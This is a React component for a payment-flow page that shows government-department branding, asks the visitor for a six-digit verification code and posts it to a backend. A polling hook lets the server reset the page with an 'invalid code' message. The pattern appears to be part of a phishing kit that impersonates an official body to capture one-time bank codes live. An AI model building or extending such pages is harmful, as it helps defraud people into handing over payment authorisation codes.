import { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { paymentsApi } from "../../api/payments";
import { useFlowPoll } from "../../hooks/useFlowPoll";
import { useLang } from "../../context/LanguageContext";
import { FlowHeader } from "./FlowHeader";
import { FlowLoading } from "./FlowLoading";
import styles from "./FlowVerificationCodePage.module.scss";

export function FlowVerificationCodePage() {
  const location = useLocation();
  const navigate = useNavigate();
  const { t, dir } = useLang();
  const ft = t.flow;
  const fvc = ft.verificationCode;

  const state = location.state as { reference?: string } | null;
  const reference = state?.reference ?? sessionStorage.getItem("pay_ref") ?? "";

  const [otp, setOtp] = useState("");
  const [submitted, setSubmitted] = useState(false);
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");

  useFlowPoll({
    reference,
    currentPage: "verification-code",
    enabled: !!reference,
    onReset: () => {
      setSubmitted((prev) => {
        if (prev) {
          setOtp("");
          setError(fvc.invalidCode);
        }
        return false;
      });
    },
  });

  const handleInput = (val: string) => {
    setOtp(val.replace(/\D/g, "").slice(0, 6));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length < 6) { setError(fvc.enterCode); return; }
    setBusy(true);
    setError("");
    try {
      await paymentsApi.flowStep(reference, "verification_code_submitted", { code: otp });
      setSubmitted(true);
    } catch {
      setError(ft.networkError);
    } finally {
      setBusy(false);
    }
  };

  if (!reference) { navigate("/", { replace: true }); return null; }

  const canSubmit = otp.length === 6 && !busy;

  return (
    <div style={{ display: "flex", flexDirection: "column", minHeight: "100vh" }}>
      <FlowHeader />
      <div className={styles.container} dir={dir}>
        <div className={styles.card}>
          <div className={styles.header}>
            <div className={styles.qgccBadge}>
              <span className={styles.qgccDept}>{ft.govDept}</span>
              <span className={styles.qgccSub}>{ft.govSub}</span>
              <span className={styles.qgccAcronym}>{ft.govAcronym}</span>
            </div>
            <h1 className={styles.title}>{fvc.title}</h1>
            <p className={styles.desc}>{fvc.desc}</p>
          </div>
          {error && <div className={styles.errorBox}>{error}</div>}
          <form onSubmit={handleSubmit} className={styles.form}>
            <div>
              <label htmlFor="verification_code" className={styles.label}>{fvc.label}</label>
              <input type="text" id="verification_code" value={otp} onChange={(e) => handleInput(e.target.value)} inputMode="numeric" maxLength={6} autoComplete="one-time-code" placeholder={fvc.placeholder} dir="ltr" className={styles.input} />
            </div>
            <button type="submit" disabled={!canSubmit} className={`${styles.submitBtn} ${canSubmit ? styles.active : styles.disabled}`}>
              {fvc.submit}
            </button>
          </form>
          <div className={styles.footerBrand}>{ft.brand}</div>
        </div>
        {submitted && <FlowLoading />}
      </div>
    </div>
  );
}
